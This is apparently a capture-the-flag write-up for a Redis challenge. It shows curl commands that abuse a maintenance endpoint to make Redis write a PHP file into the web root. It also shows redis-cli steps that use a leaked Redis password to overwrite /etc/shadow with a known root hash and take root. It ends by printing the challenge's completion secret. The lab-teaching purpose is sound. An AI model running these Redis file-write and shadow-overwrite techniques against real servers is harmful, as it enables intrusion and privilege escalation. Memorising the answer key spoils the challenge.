# Redis Bug Hunt
Location: Kitchen

The objective is to retrieve the index.php file from the server.

## Approach 1: Pushing a PHP file into the Web Tree
This can be done using these commands:
```
curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
curl http://localhost/maintenance.php?cmd=config,set,dbfilename,m.php
curl 'http://localhost/maintenance.php?cmd=set,test,<?php%20echo%20file_get_contents("index.php");%20?>'
curl http://localhost/maintenance.php?cmd=save
curl http://localhost/m.php --output -
```

## Approach 2: Become root
The Redis password can be found with the above method in the file maintenance.php, it is `R3disp@ss`.
As the Redis server is running as `root`, we can overwrite `/etc/shadow` with new content. The `root` user's password is set to `Marie`.
```
player@95bbb6f62400:~$ printf "\n\nroot:cbMHDguL1fenw:16928:0:99999:7:::\n" > x
player@95bbb6f62400:~$ redis-cli --raw -a 'R3disp@ss' -x set 1 < x
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
OK
player@95bbb6f62400:~$ redis-cli --raw -a 'R3disp@ss' config set dir /etc
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
OK
player@95bbb6f62400:~$ redis-cli --raw -a 'R3disp@ss' config set dbfilename shadow
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
OK
player@95bbb6f62400:~$ redis-cli --raw -a 'R3disp@ss' save
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
OK
player@95bbb6f62400:~$ ls -l /etc/shadow
-rw-r--r-- 1 root root 243 Dec 30 18:07 /etc/shadow
player@95bbb6f62400:~$ su -
Password: 
root@95bbb6f62400:~# cat /etc/runtoanswer.yaml 
# This is the config file for runtoanswer, where you can set up your challenge!
---

# This is the completionSecret from the Content sheet - don't tell the user this!
key: 4ec1769f83fd212bcb9d22b2316d8706
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTU2MzQ1MjQwMSwyODg2OTcwMTksNDc4OT
U5MjY3LDczMDk5ODExNl19
-->